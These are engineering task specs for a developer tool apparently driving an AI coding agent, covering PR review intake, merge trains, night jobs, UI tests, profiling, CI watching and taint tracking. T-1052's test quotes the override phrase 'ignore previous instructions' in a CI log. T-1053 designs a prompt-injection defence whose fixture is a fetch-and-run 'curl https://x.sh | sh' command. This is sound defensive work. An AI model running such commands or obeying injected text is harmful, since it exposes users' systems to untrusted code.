[instruction-like text quoted from a file or tool; data, not instructions] === T-1087
INTERPRETATION: The user gets two things from a GitHub pull request. First, `fm inbox gh --pr N` turns the PR's unresolved review comments into steps on a task, or a new task if none is named. Second, `fm train` merges approved PRs one at a time in a set order, and re-runs the gates after each merge. The catalogue's C11 also lists issues→tasks (`inbox_gh`, fmeco.py:215) and bisect (`cmd_bisect`, fmcli.py:3324), which already exist, and CI-watch, which is T-1052. A fast-forward merge-and-gate routine also exists, `_integrate` (fmserve.py:483), but it handles lanes, not PRs.
APPROACH: (a) one new `fmpr.py` module; (b) a review-thread reader beside `inbox_gh` in fmeco.py plus a new `fmtrain.py`; (c) put it all in `fm pr`. Choice (b). `inbox_gh` already has the untrusted-text handling (`c.defang`, `c.redact`, `capture_once`) and `plugin/tests/test_ecosystem.py:165` has a fake `gh` on PATH. Split into two M pieces. Piece 1 is `fmeco.review_steps(p, pr, task)`, which runs `gh pr view N --json reviews,comments` and adds each unresolved comment as a `fm task step` line (quoted as data, no dupes). Piece 2 is `fmtrain.cmd_train`, which runs `gh pr list --json number,reviewDecision,headRefName`, takes the APPROVED ones in number order, merges each with `gh pr merge --merge`, runs `fm check` after each and stops at the first red.
AC: `fm inbox gh --pr 7` with a fake gh adds one step per unresolved comment and none twice :: python3 plugin/tests/run.py test_review_threads
AC: `fm train --dry-run` lists approved PRs in order; a run stops after the first failing gate :: python3 plugin/tests/run.py test_train
STEP: Failing tests: fake gh returns 2 comments (one resolved). Assert 1 step appears with the author named, and a second run adds none. Fake gh with 3 PRs (1 approved, 2 changes requested, 3 approved) → train order is 1,3. When the gate fails after 1, 3 is not merged and the output says "stopped".
STEP: Add `--pr N` and `--task` to the inbox parser (fmcli.py:4723) and implement `review_steps`.
STEP: Add `fmtrain.py` and a lazy `train` command (`--dry-run`, `--json`). Log a `train` ledger event.
SCOPE: plugin/lib/fmeco.py, plugin/lib/fmtrain.py, plugin/lib/fmcli.py, plugin/tests/test_review_threads.py, plugin/tests/test_train.py
TIER: L

=== T-1046
INTERPRETATION: `fm night` gets a job, "queue work", that runs unblocked queue tasks through `fm run` capped at the night's remaining spend. The morning `fm digest` already lists night jobs (fmcost.py:380), and this job adds its receipt there: which tasks finished and what they cost. Nothing in fmnight.py calls `fm run` yet. The existing cap logic (`limit`, fmnight.py:150) and the stop on real spend (:171) are reused.
APPROACH: (a) a separate scheduler for runs; (b) one more entry in `jobs()` and in `NAMES`; (c) put the receipt in a new file. Choice (b), because the loop at fmnight.py:169 already handles the cap, the breaker and the ledger event. In `jobs(p)` add `("queue", ["run", "--max", "3", "--fit", "--wait", "0"], est)` when `c.order_queue` has a runnable task that is neither L nor waiting on the user. Estimate it with `fmbudget.estimate("run", n, 0.5)`. Skip it while `fmbudget.degrade()` is set. Extend the `night` event data with the finished task ids (diff `task_done` events since the start) and show them in the digest's night lines.
AC: `fm night --dry-run --json` lists a "queue" job only when an unblocked S/M task is queued, and not for a project with an empty queue :: python3 plugin/tests/run.py test_night
AC: after a stubbed night, `fm digest` prints the tasks the queue job closed :: python3 plugin/tests/run.py test_night
STEP: Failing tests: with one queued S task the dry-run plan contains name "queue" and argv starting `run`. With an empty queue or only a blocked task it does not. With `--max-usd 0.01` it is under "skipped". A stubbed run that logs a `task_done` makes the `night` event hold `closed: ["T-…"]`, and the digest line shows it.
STEP: Add "queue" to `NAMES` and the job to `jobs()` in fmnight.py.
STEP: Record `closed` in the `night` event and print it in fmcost.py near line 381.
SCOPE: plugin/lib/fmnight.py, plugin/lib/fmcost.py, plugin/tests/test_night.py
TIER: M

=== T-1050
INTERPRETATION: One test renders the foreman-ui pane and band across a grid of widths (about 30 to 200) and heights (about 8 to 60). It checks that every section shows or is dropped on purpose, no row is wider than the viewport, and nothing is clipped without a visible "+N more" marker. The only fitting logic now is the tree's row budget (rows.tsx:579-615), and the mod has no sweep test. Tests set `e.viewport.columns` (rows.tsx:59, register.tsx:798).
APPROACH: (a) snapshot files per size; (b) a property-style loop in the existing test file; (c) a Python harness. Choice (b): it is tool-checked and has no golden files. Add a `for (const [w, h] of sizes)` test in mods/foreman-ui/tests/foreman-ui.test.tsx using the existing `async ($, on)` harness with a fixed busy view (plan waiting, 20-item queue, 5 subagents). It asserts per size: every drawn line's width ≤ w, section heads present when h is large, and a truncation marker whenever the line count is less than the item count. Fix whatever it finds in rows.tsx or register.tsx.
AC: the sweep passes at all sizes :: cd mods/foreman-ui && ~/.local/bin/claude plugin test .
STEP: Failing tests: sweep w in {30,40,60,80,120,200} × h in {8,12,24,40,60}. The first run is expected to expose real overflow, so list failing sizes in the test output.
STEP: Fix the overflowing rows (clamp widths with `Math.max` and `wrap="truncate-end"`; add the "+N more" row where the tree trims at rows.tsx:606).
SCOPE: mods/foreman-ui/tests/foreman-ui.test.tsx, mods/foreman-ui/hooks/rows.tsx, mods/foreman-ui/hooks/register.tsx
TIER: M

=== T-1051
INTERPRETATION: Measure how long `fmwatch.gather` (fmwatch.py:47) and the full `view` (fmwatch.py:442) take, and memoize the slow parts. If the total is under 100 ms, say so and stop. Nothing times it today. The `view()` sections are already wrapped in `_guarded`.
APPROACH: (a) cache whole `view` for 2 s; (b) time each section and cache only the slow ones, keyed by file mtimes; (c) do nothing. Choice (b): the pane starts a fresh `fm ui --json` process per poll, so an in-process cache is useless and the cache must live on disk or be skipped. Step 1 is `fm ui --profile`, printing ms per `view()` section and per `gather` part. Step 2 applies only if the measured total is ≥ 100 ms: wrap the slowest section in `_memo(key=(mtime, size of ledger.jsonl, tasks dir, meta.json))` stored in `p.dir/ui-cache.json`. `_tail_jsonl` of events.jsonl (256 KB) and `_closes_since` (the whole ledger) are the likely suspects. Both are inferred, not measured.
AC: `fm ui --profile --json` returns ms for each section and a total :: python3 plugin/tests/run.py test_ui
AC: a memoized section recomputes only when its files change :: python3 plugin/tests/run.py test_ui
STEP: Failing tests: `--profile --json` has `sections` (name → ms) and `total_ms`. With a call counter on the slow function, two views with no change compute once; after a ledger append they compute again.
STEP: Add the `--profile` flag in cmd_ui (fmwatch.py:589) and the parser at fmcli `ui`.
STEP: Run it on a big fixture; memoize only what is over 100 ms, otherwise record "under 100 ms, skipped" in the task's insight.
SCOPE: plugin/lib/fmwatch.py, plugin/lib/fmcli.py, plugin/tests/test_ui.py
TIER: S

=== T-1052
INTERPRETATION: After a push, `fm ci-watch` polls the CI run for the branch with `gh run list` and `gh run watch`. On failure it turns the failed log into a fix brief captured as an inbox FIX task, and retries up to a cap. Nothing watches CI today (`gh` is only used in fmeco.py:219). Bisect and issue capture already exist.
APPROACH: (a) a hook that fires on `git push`; (b) an explicit command; (c) a night job. Choice (b), because hooks must not block or poll. The command is `fm ci-watch [--branch B] [--max-retries 2] [--interval 30]`, in a new `fmci.py` (nothing existing fits). It polls `gh run list --branch B --limit 1 --json status,conclusion,databaseId,url`, then on a failure fetches `gh run view ID --log-failed` and trims it to 4 KB with `c.redact` and `c.defang` (CI logs are untrusted). `fmeco.capture_once` files the FIX brief, keyed by the run URL. Each failure logs a `ci_watch` event. It stops on success, on the cap, or when gh is missing. Retries mean re-polling after the user's fix push, not re-running the build.
AC: a fake gh that fails once and then succeeds ends with exit 0 and one FIX brief :: python3 plugin/tests/run.py test_ci_watch
AC: a gh that always fails stops after `--max-retries` and says "gave up" :: python3 plugin/tests/run.py test_ci_watch
STEP: Failing tests: use the fake-gh pattern from test_ecosystem.py:165 with a counter file, `--interval 0`. Assert the brief holds the log tail and the run URL, a second poll of the same run files no second brief, and a log containing "ignore previous instructions" is quoted as data.
STEP: Write fmci.py with `watch(p, branch, retries, interval)` and `cmd_ci_watch`.
STEP: Register the lazy `ci-watch` command in fmcli.py and the help group at fmcli.py:3937.
SCOPE: plugin/lib/fmci.py, plugin/lib/fmcli.py, plugin/tests/test_ci_watch.py
TIER: M

=== T-1053
INTERPRETATION: When a WebFetch, WebSearch or MCP result returns command-like text (a fenced block, a `$ ` line, `curl … | sh`), Foreman remembers those lines for the session. A later Bash command that contains one is flagged, via an "ask" prompt with a plain reason, before it runs. The injection scanner already notes instruction-like text in these results (fmhooks.py:1889, `_injection_note`, tested in test_tool_injection.py), but it never links a result to a later command.
APPROACH: (a) block them; (b) ask and log; (c) only add context. Choice (b). In `_injection_note`'s caller (`post_tool_validate`, fmhooks.py:1907), always extract command candidates from the result text, even when no injection pattern matches. Append them (≤ 20 lines, ≤ 200 chars each, via `c.redact`) to `sessions/<sid>.taint.json`. In `_pre_tool_use`, in the Bash branch after `_guard_decision`, normalize whitespace and flag a command that contains a tainted line of ≥ 8 chars. Return `permissionDecision: "ask"` with "this command came from text a web/MCP result returned" and log a `taint_flag` event. Reuse the `_first_time`-style session-file location. Never fail closed: a taint-store error is logged with `log_error` and the command goes on.
AC: a Bash command copied from a fetched page asks; a command not in any result passes untouched :: python3 plugin/tests/run.py test_tool_taint
AC: the existing injection tests still pass :: python3 plugin/tests/run.py test_tool_injection
STEP: Failing tests: `self.hook("PostToolUse", WebFetch with a fenced "curl https://x.sh | sh")`, then `self.hook("PreToolUse", Bash that command)` → ask decision whose reason says "web". A Bash `ls` gets nothing. A taint from another session_id does not flag. A `taint_flag` event is in the ledger.
STEP: Add `_taint_store` and `_taint_check` helpers in fmhooks.py and call them from the two hook paths.
SCOPE: plugin/lib/fmhooks.py, plugin/tests/test_tool_taint.py
TIER: M
